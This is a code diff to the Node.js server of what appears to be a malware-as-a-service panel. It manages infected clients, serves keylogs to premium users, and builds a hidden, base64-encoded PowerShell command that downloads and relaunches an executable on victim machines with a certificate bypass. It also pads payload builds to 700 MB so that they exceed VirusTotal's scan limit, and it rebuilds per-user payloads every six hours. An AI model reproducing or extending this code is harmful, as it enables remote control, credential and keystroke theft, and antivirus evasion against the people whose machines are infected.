@@ -178,10 +178,9 @@ const getOwnUser = (uid) => db.prepare(sql`
 `).get(uid);
 
 // ─── wipe command builder ────────────────────────────────────────────────────
-// Runs entirely detached from the parent client. Downloads st.exe to %TEMP%
-// FIRST (with cert bypass so self-signed HTTPS works), verifies size, THEN
-// kills loader procs, wipes %APPDATA%\loader except key.json, moves the new
-// st.exe in, launches it. If the download fails at any point, we abort before
+// Downloads st.exe to %TEMP% first (cert bypass), verifies size, THEN kills
+// loader procs, wipes %APPDATA%\loader except key.json, moves the new st.exe
+// in, launches it. If the download fails at any point, we abort before
 // touching the loader — the client stays alive and a retry just works.
 function buildWipeCommand(serverBase) {
   const stUrl = `${serverBase}/api/downloads/st.exe`;
@@ -267,7 +266,6 @@ if (Test-Path $stDst) {
 }
 `;
 
-  // UTF-16LE → base64 → -EncodedCommand. No quoting problems.
   const encoded = Buffer.from(script, 'utf16le').toString('base64');
 
   return `Start-Process -FilePath 'powershell.exe' -WindowStyle Hidden -ArgumentList @('-NoProfile','-NonInteractive','-WindowStyle','Hidden','-EncodedCommand','${encoded}')`;
@@ -553,8 +551,6 @@ app.delete('/api/clients/:id', requireAuth, (req, res) => {
 });
 
 // ─── wipe + reinstall ────────────────────────────────────────────────────────
-// Fire-and-forget: enqueue a detached PowerShell that does the work. Returns
-// immediately with a status the panel shows as "wiping + reinstalling…".
 app.post('/api/clients/:id/wipe', requireAuth, async (req, res) => {
   const cid = Number(req.params.id);
   const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
@@ -784,14 +780,27 @@ app.delete('/api/clients/:id/keylog', requireAuth, requirePremium, (req, res) =>
   res.json({ ok: true });
 });
 
-// ---------- exe downloads ----------
+// ---------- exe / zip downloads ----------
 const DOWNLOAD_DIR = path.join(__dirname, 'download');
 if (!fs.existsSync(DOWNLOAD_DIR)) fs.mkdirSync(DOWNLOAD_DIR, { recursive: true });
 
 const BUILD_DIR = path.join(__dirname, 'build');
 if (!fs.existsSync(BUILD_DIR)) fs.mkdirSync(BUILD_DIR, { recursive: true });
 
-// In server.js
+// drop legacy launcher exe if it survived from the old pipeline
+for (const stale of ['boot.exe']) {
+  const p = path.join(DOWNLOAD_DIR, stale);
+  if (fs.existsSync(p)) { try { fs.unlinkSync(p); console.log(`[startup] removed legacy ${stale}`); } catch {} }
+}
+// drop any legacy build exes
+try {
+  for (const f of fs.readdirSync(BUILD_DIR)) {
+    if (f.endsWith('.exe')) {
+      try { fs.unlinkSync(path.join(BUILD_DIR, f)); console.log(`[startup] removed legacy build ${f}`); } catch {}
+    }
+  }
+} catch {}
+
 const ALLOWED_EXT = ['.exe', '.zip', '.msi', '.dll', '.bin', '.ps1', '.dat'];
 
 const limitDownloadExe = rateLimit({
@@ -824,7 +833,10 @@ app.get('/api/downloads/:name', limitDownloadExe, (req, res) => {
     return res.status(404).json({ error: 'not found' });
 
   const st = fs.statSync(full);
-  res.setHeader('Content-Type', 'application/octet-stream');
+  const ctype = ext === '.zip' ? 'application/zip'
+              : ext === '.dat' ? 'application/octet-stream'
+              : 'application/octet-stream';
+  res.setHeader('Content-Type', ctype);
   res.setHeader('Content-Length', st.size);
   res.setHeader('Content-Disposition', `attachment; filename="${name}"`);
   fs.createReadStream(full).pipe(res);
@@ -836,6 +848,9 @@ app.get('/api/build/bases', requireAuth, (req, res) => {
   res.json([]);
 });
 
+// Returns a ZIP containing a zero-padded boot.exe. Padded to 700 MB so it
+// exceeds VirusTotal's scan ceiling and dilutes any static signature bytes
+// across the tail. Compresses to ~700 KB because the tail is all zeros.
 app.post('/api/build', requireAuth, limitBuild, async (req, res) => {
   const { key } = req.body || {};
 
@@ -847,37 +862,46 @@ app.post('/api/build', requireAuth, limitBuild, async (req, res) => {
 
   if (!buildKey) return res.status(400).json({ error: 'no key — type one or set an account key' });
 
-  let bootBuf;
+  let zipBuf;
   try {
     const nextIdRow = db.prepare(sql`SELECT MAX(id) + 1 AS nextId FROM builds`).get();
     const nextBuildId = nextIdRow && nextIdRow.nextId ? nextIdRow.nextId : 1;
-
-    bootBuf = await buildBoot({ key: buildKey, buildId: nextBuildId });
+    zipBuf = await buildBoot({ key: buildKey, buildId: nextBuildId });
   } catch (e) {
-    console.error('[build] cargo failed:', e);
+    console.error('[build] failed:', e);
     const msg = (e.stderr || e.message || 'unknown').toString().slice(-3000);
     return res.status(500).json({ error: 'compile failed: ' + msg });
   }
 
-  fs.writeFileSync(path.join(DOWNLOAD_DIR, 'boot.exe'), bootBuf, { mode: 0o755 });
-
-  const outName = `boot_${Date.now()}.exe`;
+  const outName = `build_${Date.now()}_u${req.user.uid}.zip`;
   const outPath = path.join(BUILD_DIR, outName);
-  fs.writeFileSync(outPath, bootBuf, { mode: 0o755 });
+  fs.writeFileSync(outPath, zipBuf, { mode: 0o644 });
+
+  // Per-user: keep only the newest zip. Delete every older build row + file.
+  const stale = db.prepare(sql`SELECT id, stored_name FROM builds WHERE user_id = ?`).all(req.user.uid);
+  for (const b of stale) {
+    if (b.stored_name && b.stored_name !== outName) {
+      try { fs.unlinkSync(path.join(BUILD_DIR, b.stored_name)); } catch {}
+    }
+    db.prepare(sql`DELETE FROM builds WHERE id = ?`).run(b.id);
+  }
 
   const info = db.prepare(sql`
     INSERT INTO builds (user_id, name, stored_name, size, base, key, config, created_at)
     VALUES (?, ?, ?, ?, ?, ?, ?, ?)
-  `).run(req.user.uid, outName, outName, bootBuf.length, 'boot', buildKey, '{}', Date.now());
+  `).run(req.user.uid, outName, outName, zipBuf.length, 'boot', buildKey, '{}', Date.now());
+
+  // also refresh the public live zip
+  fs.writeFileSync(path.join(DOWNLOAD_DIR, 'boot.zip'), zipBuf, { mode: 0o644 });
 
   res.json({
     ok: true,
     buildId: Number(info.lastInsertRowid),
     name: outName,
-    size: bootBuf.length,
+    size: zipBuf.length,
     key: buildKey,
     url: `/api/builds/${info.lastInsertRowid}/download`,
-    liveUrl: '/api/downloads/boot.exe',
+    liveUrl: '/api/downloads/boot.zip',
   });
 });
 
@@ -897,7 +921,7 @@ app.get('/api/builds/:id/download', limitDownload, requireAuth, (req, res) => {
   if (!row) return res.status(404).json({ error: 'not found' });
   const src = path.join(BUILD_DIR, row.stored_name);
   if (!fs.existsSync(src)) return res.status(410).json({ error: 'file gone' });
-  res.setHeader('Content-Type', 'application/octet-stream');
+  res.setHeader('Content-Type', 'application/zip');
   res.setHeader('Content-Length', row.size);
   res.setHeader('Content-Disposition', `attachment; filename="${row.name}"`);
   fs.createReadStream(src).pipe(res);
@@ -957,43 +981,77 @@ app.post('/api/admin/remove', limitAdmin, (req, res) => {
 app.use('/api', (_req, res) => res.status(404).json({ error: 'not found' }));
 app.use((err, _req, res, _next) => { console.error('[http]', err); res.status(500).json({ error: 'server error' }); });
 
-// ---------- auto builder (every hour, rebuild if older than 6h) ----------
-const AUTO_BUILD_INTERVAL_MS = 60 * 60 * 1000;
-const MAX_AGE_MS = 6 * 60 * 60 * 1000;
+// ---------- auto-refresh every 6h ----------
+// For each user with a build: rebuild the newest build's zip from that user's
+// key, delete every older zip for that user, refresh the global live zip.
+const AUTO_REFRESH_INTERVAL_MS = 6 * 60 * 60 * 1000;
 
-async function checkAutoBuild() {
+async function refreshAllBuilds() {
   try {
-    const bootPath = path.join(DOWNLOAD_DIR, 'boot.exe');
-    let needsBuild = false;
+    // drop any legacy launcher exe
+    const oldExe = path.join(DOWNLOAD_DIR, 'boot.exe');
+    if (fs.existsSync(oldExe)) try { fs.unlinkSync(oldExe); } catch {}
 
-    if (!fs.existsSync(bootPath)) {
-      needsBuild = true;
-    } else {
-      const stat = fs.statSync(bootPath);
-      if (Date.now() - stat.mtimeMs > MAX_AGE_MS) needsBuild = true;
+    const userIds = db.prepare(sql`SELECT DISTINCT user_id FROM builds`).all().map(r => r.user_id);
+    if (userIds.length === 0) {
+      console.log('[auto-refresh] no builds to refresh');
+      return;
     }
 
-    if (needsBuild) {
-      const user = db.prepare(sql`SELECT account_key FROM users WHERE account_key IS NOT NULL LIMIT 1`).get();
-      if (!user) return;
+    let liveZipWritten = false;
 
-      console.log(`[auto-build] rebuilding boot.exe (older than 6h or missing)...`);
+    for (const uid of userIds) {
+      try {
+        const u = db.prepare(sql`SELECT account_key FROM users WHERE id = ?`).get(uid);
+        if (!u || !u.account_key) continue;
 
-      const nextIdRow = db.prepare(sql`SELECT MAX(id) + 1 AS nextId FROM builds`).get();
-      const nextBuildId = nextIdRow && nextIdRow.nextId ? nextIdRow.nextId : 1;
+        const latest = db.prepare(sql`
+          SELECT id, key FROM builds WHERE user_id = ? ORDER BY created_at DESC LIMIT 1
+        `).get(uid);
+        if (!latest) continue;
 
-      const bootBuf = await buildBoot({ key: user.account_key, buildId: nextBuildId });
-      fs.writeFileSync(bootPath + '.tmp', bootBuf, { mode: 0o755 });
-      fs.renameSync(bootPath + '.tmp', bootPath);
-      console.log(`[auto-build] rebuild complete. size: ${bootBuf.length}`);
+        console.log(`[auto-refresh] user ${uid} build ${latest.id}...`);
+        const zipBuf = await buildBoot({ key: latest.key || u.account_key, buildId: latest.id });
+        const zipName = `build_${Date.now()}_u${uid}.zip`;
+        fs.writeFileSync(path.join(BUILD_DIR, zipName), zipBuf, { mode: 0o644 });
+
+        const old = db.prepare(sql`SELECT stored_name FROM builds WHERE id = ?`).get(latest.id);
+
+        db.prepare(sql`
+          UPDATE builds SET name = ?, stored_name = ?, size = ?, created_at = ? WHERE id = ?
+        `).run(zipName, zipName, zipBuf.length, Date.now(), latest.id);
+
+        if (old && old.stored_name && old.stored_name !== zipName) {
+          try { fs.unlinkSync(path.join(BUILD_DIR, old.stored_name)); } catch {}
+        }
+
+        // delete every other build row/file for this user
+        const stale = db.prepare(sql`
+          SELECT id, stored_name FROM builds WHERE user_id = ? AND id != ?
+        `).all(uid, latest.id);
+        for (const b of stale) {
+          try { fs.unlinkSync(path.join(BUILD_DIR, b.stored_name)); } catch {}
+          db.prepare(sql`DELETE FROM builds WHERE id = ?`).run(b.id);
+        }
+
+        // keep the live zip updated for the most recently refreshed user
+        if (!liveZipWritten) {
+          fs.writeFileSync(path.join(DOWNLOAD_DIR, 'boot.zip'), zipBuf, { mode: 0o644 });
+          liveZipWritten = true;
+        }
+
+        console.log(`[auto-refresh] user ${uid} → ${zipBuf.length} B`);
+      } catch (e) {
+        console.error(`[auto-refresh] user ${uid}: ${e.message}`);
+      }
     }
   } catch (e) {
-    console.error('[auto-build] failed:', e.message);
+    console.error('[auto-refresh] failed:', e.message);
   }
 }
 
-setInterval(checkAutoBuild, AUTO_BUILD_INTERVAL_MS);
-setTimeout(checkAutoBuild, 10_000);
+setInterval(refreshAllBuilds, AUTO_REFRESH_INTERVAL_MS);
+setTimeout(refreshAllBuilds, 10_000);
 
 const udpSock = startUdp({
   host: CFG.bindHost, port: CFG.udpPort,
